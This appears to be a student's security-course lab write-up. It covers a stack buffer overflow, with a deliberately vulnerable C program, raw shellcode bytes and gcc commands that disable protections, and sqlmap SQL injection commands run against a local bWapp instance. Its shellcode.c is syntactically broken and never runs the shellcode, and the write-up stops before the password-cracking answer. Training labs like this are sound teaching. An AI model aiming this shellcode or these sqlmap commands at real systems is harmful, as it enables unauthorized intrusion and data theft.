# Lab #1, 22110010, Nguyen Huynh Quoc Bao, INSE330380E_03FIE
# Task 1: Software buffer overflow attack
This lab demonstrate a software buffer overflow attack to exploit vulnerabilities and execute arbitrary code using a vulnerable C program and shellcode.

**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Answer 1**:
## 1. Create C program name `vulnerable.c` and `shellcode.c`:
*First, we use the command to create C program file in cmd:*
### Vulnerable.c program
```
nano vulnerable.c
```

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
    char buffer[16];
    strcpy(buffer,argv[1]);
    return 0;
}
```
![alt text](img/vulnerable_c.png)
### Shellcode.c program
```
nano shellcode.c
```
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
![alt text](img/shellcode_c.png)
## 2. Use gcc to complie code to executable code
*After that, we use gcc to complie code from above to create a executable code that exist in ls of cmd*
```
gcc -o shellcode shellcode.c -fno-stack-protector -z execstack
```
![alt text](img/shellcode_gcc.png)
```
gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack
```
![alt text](img/vulnerable_gcc.png)

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

## 1. Install bWapp
*First, we need to install bWapp and setup. Use docker command to pull bWapp on the located file*
```
docker pull raesene/bwapp
```
![alt text](img/bWapp_install.png)

*After that, use docker run command to release the docker file*

![alt text](img/bWapp_run.png)

*After all, when we paste the `localhost:8025/install.php` on browser address bar and the webpage appear (When install finished)*
![alt text](img/bWapp_finish.png)

## 2. Install sqlmap:
*Use the link: https://github.com/sqlmapproject/sqlmap.git to download sqlmap to your computer*

## Attack
*Login into the webpage that we already access Click Installation, login with the given account to access to the portal*
![alt text](img/bWapp_portal.png)
*Get the cookie to attack*
![alt text](img/cookies.png)
*Cookie value: at1g88ndl1a334gnk1mskn0ph1*

**Question 1**: Use sqlmap to get information about all available databases

**Answer 1**:
*Go to SQL Injection - SELECT*
![alt text](<img/SQL Injection.png>)
*Select random moive:*
![alt text](img/movie.png)
*Then we will get the action go in the URL page*
`http://localhost:8025/sqli_2.php?movie=10&action=go`
*Use this command to access:*
`python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=10" --cookie="PHPSESSID=at1g88ndl1a334gnk1mskn0ph1;security_level=0" --dbs`
![alt text](img/img_1.png)
*We will get the answer:*
![alt text](img/img_2.png)
**Question 2**: Use sqlmap to get tables, users information

**Answer 2**:
*Use this command to ghet table:*
`python3 sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=10" --cookie="PHPSESSID=t1g88ndl1a334gnk1mskn0ph1;security_level=0"  --tables`

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit 

**Answer 3**: